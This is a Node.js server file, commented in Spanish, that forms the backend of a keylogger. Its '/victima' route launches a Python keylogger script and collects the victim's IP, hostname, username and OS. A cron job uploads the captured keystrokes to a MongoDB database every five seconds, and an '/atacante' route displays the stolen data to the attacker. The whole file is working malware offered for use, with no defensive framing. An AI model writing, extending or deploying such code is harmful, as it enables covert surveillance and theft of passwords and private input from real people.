//Configuraciones para el puerto y el uri de mongo
const { PORT, MONGO_URI } = require("./config");
//modelo definido para guardar los datos del la victima
const { keyloggerModel } = require('./models');
//Modulo para obtener comunicación entre Nodejs y mongodb
const mongoose = require('mongoose');
const express = require('express')
const { spawn } = require('child_process')
var fs = require('fs');
const publicIp = require('public-ip');
var cron = require('node-cron');
const os = require('os');
const app = express();

const mongo_uri = MONGO_URI;
mongoose.connect(mongo_uri, { useNewUrlParser: true, useUnifiedTopology: true, useFindAndModify: false, useCreateIndex: true,  }, function(err) {
  if (err) {
    throw err;
  } else {
    console.log(`Successfully connected to ${mongo_uri}`);
  }
});

var contenido = ""

app.get('/victima', async (req, res) => {

  //Ip de la víctima
  ip_victim = await publicIp.v4();
  //Arquitectura de la computadora
  arch_victim = os.arch();
  //Nombre del dispositivo
  name_device_victim = os.hostname();
  //Usuario del dispositivo
  user_victim = os.userInfo().username;
  //Sistema operativo
  so_victim = os.platform();

  // spawn new child process to call the python script
  const python = spawn('python', ['keylogger.py'])
  //Leyendo el contenido del txt donde se encuentra las teclas de la víctima
  contenido = fs.readFileSync('teclas.txt', 'utf8');

  //Estructurando características
  res.send("ip: "+ ip_victim +"\narquitectura: "+ arch_victim + "\nnombre del dispositivo: "+ name_device_victim +"\nusuario: "+ user_victim +"\nsistema operativo: "+ so_victim +"\n\n\n" + contenido);

  //Cuando no tiene nada de content se crea y se guarda
  //Definición del modelo donde se guardará la información inicial
  const victima = await keyloggerModel.find({ ip: ip_victim });

  if (victima.length > 0){
    console.log("Ya existe esa victima")
  }
  else{
    var stolendata = new keyloggerModel({ ip: ip_victim, arquitectura: arch_victim, nombre: name_device_victim, usuario: user_victim, so: so_victim });
    stolendata.save(function(err) {
      if (err) {
        console.log(err);
      }
    });
  }

  


})

//Cron para ejecutar una tarea cada 5 segundos
cron.schedule('*/5 * * * * *', async () => {
  console.log('obteniendo la data cada 5 segundos');

    //Ip de la víctima
    ip_victim = await publicIp.v4();
    //Arquitectura de la computadora
    arch_victim = os.arch();
    //Nombre del dispositivo
    name_device_victim = os.hostname();
    //Usuario del dispositivo
    user_victim = os.userInfo().username;
    //Sistema operativo
    so_victim = os.platform();

    //Leer el archivo para verficiar si hay contenido o no y actualizar los datos en la nube
    fs.readFile("teclas.txt", "utf-8", (err, data) => {
      //console.log(data);
      informacion = data.toString();
      if(informacion.length > 0){
        //Actualiza en base a la frecuencia definida las teclas hechas por la victima
        keyloggerModel.findOneAndUpdate( 
          { ip: ip_victim } , 
          {$set:{content: informacion }}, 
          {new: true}, (err, doc) => {if (err) {console.log(err)}});
  
      }
    });

});

//Ruta exclusiva para el atacante y vea el cambio de las teclas de la victima en cierta
//frecuencia
app.get('/atacante', async (req, res) => {

  const victima = await keyloggerModel.find({});

  if(victima.length > 0){
    res.send("ip: "+ victima[0].ip +"\narquitectura: "+ victima[0].arquitectura + "\nnombre del dispositivo: "+ victima[0].nombre +"\nusuario: "+ victima[0].usuario +"\nsistema operativo: "+ victima[0].so +"\n\n\n" + victima[0].content);
  }
  else{
    res.send("No hay victima")
  }
  

})

//Puerto donde se escuchará
app.listen(PORT, () => {
  console.log(`App listening on port ${PORT}!`)
})